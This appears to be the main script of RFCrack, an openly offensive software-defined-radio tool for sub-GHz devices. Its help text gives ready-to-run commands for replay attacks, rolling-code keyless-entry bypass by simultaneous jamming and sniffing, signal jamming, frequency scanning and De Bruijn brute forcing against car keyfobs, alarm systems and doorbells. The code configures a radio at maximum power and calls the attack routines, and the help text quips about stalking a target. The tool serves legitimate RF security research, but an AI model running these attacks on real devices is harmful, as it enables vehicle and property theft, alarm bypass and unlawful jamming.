
from rflib import *
import src.RFFunctions as tools
import re, time, argparse, textwrap
import src.jam as jam
import src.findDevices as findDevices
import src.attacks as attacks
import src.RFSettings as RFSettings
import src.utilities as utilities
import src.Clicker as Clicker
import sys

sys.dont_write_bytecode = True
parser = argparse.ArgumentParser(add_help=True, formatter_class=argparse.RawDescriptionHelpFormatter, description=textwrap.dedent('''\

                ___                  _        ___            _
  / __|___ _ _  ___ ___| |___   / __|_____ __ _| |__  ___ _  _ ___
 | (__/ _ \ ' \(_-</ _ \ / -_) | (__/ _ \ V  V / '_ \/ _ \ || (_-<
  \___\___/_||_/__/\___/_\___|  \___\___/\_/\_/|_.__/\___/\_, /__/
                                                          |__/
            ___ ___ ___             _
      ___  | _ \ __/ __|_ _ __ _ __| |__
     |___| |   / _| (__| '_/ _` / _| / /
           |_|_\_| \___|_| \__,_\__|_\_\


    Welcome to RFCrack - A Software Defined Radio Attack Tool

    Developer: @Ficti0n - http://ConsoleCowboys.com
    CCLabs: http://cclabs.io
    Blog: console-cowboys.blogspot.com
    Release Tutorial: https://www.youtube.com/watch?v=H7-g15YZBiI
    Reversing Signals With RFCrack: https://www.youtube.com/watch?v=XqKoVFyOst0
    Release: 1.5_Temp (This update is syntactical for python3 untested)

    Hardware Needed: (1 Yardstick or 2 for RollingCode)
    YardStick: https://goo.gl/wd88sr

    RFCrack is my personal RF test bench, it was developed for testing RF communications
    between any physical device that communicates over sub Ghz frequencies. IoT devices,
    Cars, Alarm Systems etc... Testing was done with the Yardstick One on OSX, but
    RFCrack should work fine in linux. Support for other RF related testing will be
    added as needed in my testing. I am currently researching keyless Entry bypasses and
    other signal analysis functionality. New functionality will be added in the future with
    additional hardware requirements for some advanced attacks.

    Feel free to use this software as is for personal use only. Do not use this code
    in other projects or in commercial products. I hold no liability for your actions
    with this code. Your life choices are your own.


    Current supported Functionality:
    ---------------------------------
    - Replay attacks -i -F
    - Send Saved Payloads -s -u
    - Rolling code bypass attacks -r -F -M
    - Targeted -t -F
    - Jamming -j -F
    - Scanning incrementally through frequencies -b -v -F
    - Scanning common frequencies -k
    - Compare Live incoming signals to previous signal -k -c -f -u
    - Graph Signal -n -g -u


    Usage Examples / Attacks:
    -------------------------
    Live Replay:         python RFCrack.py -i
    Rolling Code:        python RFCrack.py -r -M MOD_2FSK -F 314350000
    Adjust RSSI Values:  python RFCrack.py -r -M MOD_2FSK -F 314350000 -U -100 -L -10
    Jamming:             python RFCrack.py -j -F 314000000
    Scan common freq:    python RFCrack.py -k
    Scan with your list: python RFCrack.py -k -f 433000000 314000000 390000000
    Incremental Scan:    python RFCrack.py -b -v 5000000
    Send Saved Payload:  python RFCrack.py -s -u ./captures/test.cap -F 315000000 -M MOD_ASK_OOK
    With Loaded Config:  python RFCrack.py -l ./device_templates/doorbell.config -r
    Graph a Signal:      python RFCrack.py -n -g -u 1f0fffe0fffc01ff803ff007fe0fffc1fff83fff07

    Live Signal Identification and Comparison (Use 2 Console Windows):
    -----------------------------------------------------------------
    Setup sniffer:      python RFCrack.py -k -c -f 390000000
    Setup Analysis:     python RFCrack.py -c -u 1f0fffe0fffc01ff803ff007fe0fffc1fff83fff07f -n

    Useful arguments:
    ------------------------
    -M Change modulation, usually MOD_2FSK or MOD_ASK_OOK
    -F Change the frequency used in attacks
    -U upper_rssi signal strength value for rolling Code
    -L lower.rssi signal strength value for rolling code
    -S Change Channel Spacing
    -V Change Deviation of modulation
    -a Jamming frequency variance from sniffer
    -s Send packet from a file source
    -d Save your current device settings into a loadable template
    -l Load previously saved device configuration with attack
    -n Your using functionality that does not require a yardstick plugged in
    -u Use saved data in your attack

    Directories Explained:
    ----------------------
    Saved captures get saved to ./captures directory by default!
    Live signal identification captures also saved to ./captures directory in capturedClicks.log
    Device templates are saved and loaded to ./device_templates by default
    Scanning logs are saved to ./scanning_logs named based on date and time of scanning start
    Graph comparison images are saved to imageOutput in 2 formats
     - Live: LiveComparison.png will just be written over on each signal Analysis
     - Log analysis: Comparison1 Comparison2 format is used and written over on each log analysis

    Other Notes:
    ------------------------
    Understand that Rolling code is hit or miss due to its nature with jamming and sniffing at the same time,
    but it works. Just use the keyfob near the yardsticks as if you were stalking your target.
    It will also require 2 yardsticks, one for sniffing while the other one is jamming. Yardsticks do not
    send and receive at the same time.

    And a final note, this is my own test bench for doing research and dev, if you have ideas
    to make RFCrack better based on realistic use case scenarios, feel free to reach out to me If
    the ideas are realistic, well thought out, and re-useable use cases I will implement them.

       '''))

parser.add_argument("-s", "--send", action='store_true', help=argparse.SUPPRESS)
parser.add_argument("-i", "--instant_replay", action='store_true', help=argparse.SUPPRESS)
parser.add_argument("-r", "--rolling_code", default= False, action='store_true', help=argparse.SUPPRESS)
parser.add_argument("-t", "--targeted_attack", help=argparse.SUPPRESS)
parser.add_argument("-j", "--jammer", action='store_true', help=argparse.SUPPRESS)
parser.add_argument("-b", "--brute_scanner",action='store_true', help=argparse.SUPPRESS)
parser.add_argument("-k", "--known_scanner",action='store_true', help=argparse.SUPPRESS)
parser.add_argument("-v", "--increment_value", help=argparse.SUPPRESS ,type=int)
parser.add_argument('-u', "--uploaded_payload",  help=argparse.SUPPRESS)
parser.add_argument('-f', "--list",nargs='+', type=int, default=[315000000, 433000000], help=argparse.SUPPRESS)
parser.add_argument('-a', "--jamming_variance", default=80000, help=argparse.SUPPRESS, type=int)
parser.add_argument('-d', "--save_device_settings",action='store_true', help=argparse.SUPPRESS)
parser.add_argument('-l', "--load_device_settings", help=argparse.SUPPRESS)
parser.add_argument('-c', "--compare",action='store_true', help=argparse.SUPPRESS)
parser.add_argument('-n', "--no_instance",action='store_true', help=argparse.SUPPRESS)
parser.add_argument('-g', "--graph_signal",action='store_true', help=argparse.SUPPRESS)
parser.add_argument('-D', "--de_bruijn",action='store_true', help=argparse.SUPPRESS)
parser.add_argument('-B', "--baud_rate", default=4800, help=argparse.SUPPRESS, type=int)
parser.add_argument('-U', "--upper_rssi", default=-100, help=argparse.SUPPRESS, type=int)
parser.add_argument('-L', "--lower_rssi", default=-20, help=argparse.SUPPRESS, type=int)
parser.add_argument("-F", "--frequency",default=315000000, help=argparse.SUPPRESS, type=int)
parser.add_argument('-C', "--channel_bandwidth", default=60000, help=argparse.SUPPRESS, type=int)
parser.add_argument("-M", "--modulation_type",default="MOD_ASK_OOK", help=argparse.SUPPRESS)
parser.add_argument("-S", "--channel_spacing",default=24000, help=argparse.SUPPRESS,type=int)
parser.add_argument("-V", "--deviation", default=0, help=argparse.SUPPRESS,type=int)


args = parser.parse_args()


rf_settings = RFSettings.RFSettings(args.frequency,
                                    args.baud_rate,
                                    args.channel_bandwidth,
                                    args.modulation_type,
                                    args.upper_rssi,
                                    args.lower_rssi,
                                    args.channel_spacing,
                                    args.deviation)
if (args.load_device_settings != None):
    with open(args.load_device_settings) as f:
        file_data = f.readlines()
        rf_settings.loadDeviceSettingsTemplate(file_data)

if not args.jammer and not args.no_instance:
    d = RfCat(idx=0)
    d.setFreq(int(rf_settings.frequency))
    d.setMdmDRate(rf_settings.baud_rate)
    d.setMaxPower()
    d.setMdmChanSpc(rf_settings.channel_spacing)
    d.setMdmChanBW(rf_settings.channel_bandwidth)
    d.setMdmSyncMode(0)
    d.setChannel(0)
    d.lowball(1)
    if (rf_settings.deviation != 0):
        d.setMdmDeviatn(rf_settings.deviation)
    if (rf_settings.modulation_type == "MOD_ASK_OOK"):
        d.setMdmModulation(MOD_ASK_OOK)
    elif (rf_settings.modulation_type == "MOD_2FSK"):
        d.setMdmModulation(MOD_2FSK)


if args.rolling_code:
    print("Don't forget to change the default frequency and modulation type")
    attacks.rollingCode(d, rf_settings, args.rolling_code, args.jamming_variance)

if args.known_scanner and not args.compare:
    print("For a custom list use the -z option in the format -f 433000000 314000000 390000000")
    findDevices.searchKnownFreqs(d, args.list)

if args.brute_scanner:
    if args.increment_value == None:
        print("Bruteforcing requires -v argument for an incrementing inteval value Example: 500000")
    else:
        findDevices.bruteForceFreq(d, rf_settings, args.increment_value)

if args.jammer:
    j = jam.setupJammer(0, rf_settings)
    jam.jamming(j, "start", rf_settings, args.rolling_code)

if args.instant_replay:
    attacks.replayLiveCapture(d, args.rolling_code, rf_settings)

if args.send:
    if args.uploaded_payload == None:
        print("Send requires -u argument for an upload file path  Example: ./captures/payload.cap")
    else:
        attacks.replaySavedCapture(d, args.uploaded_payload)

if args.save_device_settings:
    device_name = input( "What would you like to name the device template: ")
    rf_settings.saveDeviceSettingsTemplate(rf_settings, device_name)

if args.known_scanner and args.compare:
    print("Uses lowercase f parameter to specify a single value Frequency list")
    findDevices.searchKnownFreqs(d, args.list, args.compare)

if args.compare and args.uploaded_payload != None:
    my_clicker = Clicker.Clicker(args.uploaded_payload)
    utilities.logTail(my_clicker)

if args.graph_signal and args.uploaded_payload != None:
    my_clicker = Clicker.Clicker(args.uploaded_payload)
    captured_payload_binary = my_clicker.payloadsToBinary(my_clicker.captured_payload)
    my_clicker.createGraph(captured_payload_binary,0)
    my_clicker.outputImagesComparisons(1)
    my_clicker.openImage('./imageOutput/Graph1.png')
if args.de_bruijn:
    attacks.deBruijn(d)
